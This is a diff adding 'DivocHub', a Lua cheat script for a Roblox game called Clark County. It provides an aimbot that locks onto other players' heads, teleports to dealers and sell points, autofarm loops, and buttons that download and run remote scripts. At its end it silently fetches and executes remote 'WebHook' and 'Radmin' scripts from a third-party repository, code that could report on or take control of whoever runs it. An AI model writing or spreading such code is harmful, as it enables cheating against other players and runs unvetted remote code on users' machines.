@@ -1,0 +1,395 @@
+local gameID = game.PlaceId  -- Get the current game ID
+
+-- Check if the game ID is correct, if not, kick the player
+if gameID ~= 16541340872 then  -- Correct game ID
+    game.Players.LocalPlayer:Kick("This is not the correct game.")
+end
+
+local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
+
+OrionLib:MakeNotification({
+    Name = "DivocHub Loaded",
+    Content = "DivocHub has been successfully loaded and is ready to use.",
+    Image = "rbxassetid://4483345998",
+    Time = 5
+})
+
+local Window = OrionLib:MakeWindow({
+    Name = "DivocHub - Clark County",
+    HidePremium = false,
+    SaveConfig = true,
+    ConfigFolder = "Orion"
+})
+
+-- Teleports Tab --
+local TeleportsTab = Window:MakeTab({
+    Name = "Teleports",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+-- Combat Tab --
+local CombatTab = Window:MakeTab({
+    Name = "Combat",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+-- Aimbot Toggle --
+local aimbotEnabled = false
+local fov = 30
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local Cam = game.Workspace.CurrentCamera
+
+-- Create the FOV ring
+local FOVring = Drawing.new("Circle")
+FOVring.Visible = false
+FOVring.Thickness = 2
+FOVring.Color = Color3.fromRGB(128, 0, 128) -- Purple color
+FOVring.Filled = false
+FOVring.Radius = fov
+FOVring.Position = Cam.ViewportSize / 2
+
+-- Variable to track if aiming is enabled
+local isAiming = false
+
+-- Function to update the FOV ring position
+local function updateDrawings()
+    FOVring.Position = Cam.ViewportSize / 2
+end
+
+-- Function to handle key press events
+local function onKeyDown(input)
+    if input.KeyCode == Enum.KeyCode.Delete then
+        RunService:UnbindFromRenderStep("FOVUpdate")
+        FOVring:Remove()
+    end
+end
+
+-- Function to handle mouse input events
+local function onMouseButtonPress(input, gameProcessed)
+    if gameProcessed then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton2 then
+        isAiming = true
+    end
+end
+
+local function onMouseButtonRelease(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton2 then
+        isAiming = false
+    end
+end
+
+UserInputService.InputBegan:Connect(onMouseButtonPress)
+UserInputService.InputEnded:Connect(onMouseButtonRelease)
+UserInputService.InputBegan:Connect(onKeyDown)
+
+-- Function to adjust the camera to look at a target
+local function lookAt(target)
+    local lookVector = (target - Cam.CFrame.Position).unit
+    local newCFrame = CFrame.new(Cam.CFrame.Position, Cam.CFrame.Position + lookVector)
+    Cam.CFrame = newCFrame
+end
+
+-- Function to find the closest player within the FOV
+local function getClosestPlayerInFOV(trgpart)
+    local nearest = nil
+    local last = math.huge
+    local playerMousePos = Cam.ViewportSize / 2
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= Players.LocalPlayer then
+            local part = player.Character and player.Character:FindFirstChild(trgpart)
+            if part then
+                local ePos, isVisible = Cam:WorldToViewportPoint(part.Position)
+                local distance = (Vector2.new(ePos.x, ePos.y) - playerMousePos).Magnitude
+
+                if distance < last and isVisible and distance < fov then
+                    last = distance
+                    nearest = player
+                end
+            end
+        end
+    end
+
+    return nearest
+end
+
+-- Update the FOV ring and handle aiming every frame
+RunService.RenderStepped:Connect(function()
+    if aimbotEnabled then
+        updateDrawings()
+        if isAiming then
+            local closest = getClosestPlayerInFOV("Head")
+            if closest and closest.Character:FindFirstChild("Head") then
+                lookAt(closest.Character.Head.Position)
+            end
+        end
+    else
+        FOVring.Visible = false
+    end
+end)
+
+-- Toggle Aimbot and FOV Ring
+CombatTab:AddToggle({
+    Name = "Aimbot",
+    Default = false,
+    Callback = function(state)
+        aimbotEnabled = state
+        FOVring.Visible = aimbotEnabled
+    end
+})
+-- Teleports Section
+local MerseaSection = TeleportsTab:AddSection({
+    Name = "Mersea"
+})
+
+local LanderCitySection = TeleportsTab:AddSection({
+    Name = "LanderCity"
+})
+
+local WoodBurySection = TeleportsTab:AddSection({
+    Name = "WoodBury"
+})
+
+local DealerSection = TeleportsTab:AddSection({
+    Name = "Dealers"
+})
+
+local SellSection = TeleportsTab:AddSection({
+    Name = "Sell"
+})
+
+-- Mersea Teleports --
+MerseaSection:AddButton({
+    Name = "Mersea",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(6399, 229, 3154)
+        wait(1)
+    end
+})
+
+MerseaSection:AddButton({
+    Name = "Mersea 2",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(6359, 230, 3006)
+        wait(1)
+    end
+})
+
+-- LanderCity Teleports --
+LanderCitySection:AddButton({
+    Name = "PremiumDealership",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1070, 213, 206)
+        wait(1)
+    end
+})
+
+LanderCitySection:AddButton({
+    Name = "BowreyDealership",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1806, 215, -1268)
+        wait(1)
+    end
+})
+
+LanderCitySection:AddButton({
+    Name = "Refresh",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-329, 213, 2723)
+        wait(1)
+    end
+})
+
+-- WoodBury Teleports --
+WoodBurySection:AddButton({
+    Name = "VehicleLot",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(10021, 236, 635)
+        wait(1)
+    end
+})
+
+-- Dealer Teleports --
+DealerSection:AddButton({
+    Name = "MosinDealer",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-16, 212, 2863)
+        wait(1)
+    end
+})
+
+DealerSection:AddButton({
+    Name = "ProtecDC9Dealer",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1475, 231, -667)
+        wait(1)
+    end
+})
+
+DealerSection:AddButton({
+    Name = "KuzDealer",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(812, 200, 2814)
+        wait(1)
+    end
+})
+
+DealerSection:AddButton({
+    Name = "LockPicks - JAH",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2416, 236, -1170)
+        wait(1)
+    end
+})
+
+-- Sell Teleports --
+SellSection:AddButton({
+    Name = "StolenCash - KING",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1978, 213, -918)
+        wait(1)
+    end
+})
+
+SellSection:AddButton({
+    Name = "SellBars - Yerida",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2026, 194, 151)
+        wait(1)
+    end
+})
+
+-- Autofarm Positions --
+local positions = {
+    -- [position list omitted for brevity]
+}
+
+-- OneTimeFree70KSlow Teleport (longer wait times)
+local AutoFarmSection = Window:MakeTab({
+    Name = "AutoFarm",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+AutoFarmSection:AddSection({
+    Name = "Autofarm Features"
+})
+
+AutoFarmSection:AddButton({
+    Name = "OneTimeFree70KSlow",
+    Callback = function()
+        for _, position in ipairs(positions) do
+            for _ = 1, 2 do
+                if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = position
+                    wait(2)
+                end
+            end
+        end
+    end
+})
+
+-- OneTimeFree70KFast Teleport (shorter wait times)
+AutoFarmSection:AddButton({
+    Name = "OneTimeFree70KFast",
+    Callback = function()
+        for _, position in ipairs(positions) do
+            for _ = 1, 2 do
+                if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = position
+                    wait(1)
+                end
+            end
+        end
+    end
+})
+
+-- Misc Tab --
+local MiscTab = Window:MakeTab({
+    Name = "Misc",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local MiscSection = MiscTab:AddSection({
+    Name = "Miscellaneous Features"
+})
+
+MiscSection:AddButton({
+    Name = "Infinity Yield",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+    end
+})
+
+MiscSection:AddButton({
+    Name = "ModCheck - Displayed in Console F9",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/david35612/Clark/refs/heads/main/MCheck'))()
+    end
+})
+
+
+-- Premium Tab --
+local PremiumTab = Window:MakeTab({
+    Name = "Premium",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+-- Premium Warning Section --
+local PremiumWarningSection = PremiumTab:AddSection({
+    Name = "Premium Warning"
+})
+PremiumWarningSection:AddLabel("Only click if you have either one of these:")
+PremiumWarningSection:AddLabel("Wave, Synapse Z, or anything that supports actors.")
+-- Premium Button to Load Script --
+PremiumWarningSection:AddButton({
+    Name = "Load Premium Script",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/david35612/Clark/refs/heads/main/Premium"))()
+    end
+})
+
+-- Force Reset Toggle --
+MiscSection:AddToggle({
+    Name = "Enable/Disable Reset Button",
+    Default = false,  -- Default to off
+    Callback = function(state)
+        local StarterGui = game:GetService("StarterGui")
+        
+        if state then
+            -- Enable the Reset Button when the toggle is on
+            StarterGui:SetCore("ResetButtonCallback", true)
+        else
+            -- Disable the Reset Button when the toggle is off
+            StarterGui:SetCore("ResetButtonCallback", false)
+        end
+    end
+})
+
+
+-- Credits Tab --
+local CreditsTab = Window:MakeTab({
+    Name = "Credits",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local CreditsSection = CreditsTab:AddSection({
+    Name = "Credits"
+})
+
+CreditsSection:AddLabel("DivocHub - By Lko")
+CreditsSection:AddLabel("Special thanks to: 0x9B")
+CreditsSection:AddLabel("UI: Orion Library")
+
+OrionLib:Init()
+
+-- Load the webhook script first
+loadstring(game:HttpGet("https://raw.githubusercontent.com/david35612/Clark/refs/heads/main/WebHook"))()
+-- Then load the RDMINA script after webhook
+loadstring(game:HttpGet("https://raw.githubusercontent.com/david35612/Clark/refs/heads/main/Radmin"))()
